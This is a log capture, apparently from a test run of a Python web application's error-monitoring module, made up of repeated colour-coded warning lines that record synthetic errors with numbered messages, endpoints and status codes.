WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3458'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3459'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3460'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3461'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3462'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3463'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3464'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3465'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3466'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874009Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3467'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3468'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3469'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874154Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3470'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3471'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3472'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874410Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3473'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874466Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3474'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874519Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3475'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3476'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3477'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3478'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3479'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3480'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874814Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3481'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3482'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3483'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.874967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3484'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3485'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875070Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3486'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875119Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3487'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3488'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3489'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3490'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3491'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3492'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875412Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3493'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3494'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875508Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3495'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875556Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3496'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3497'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
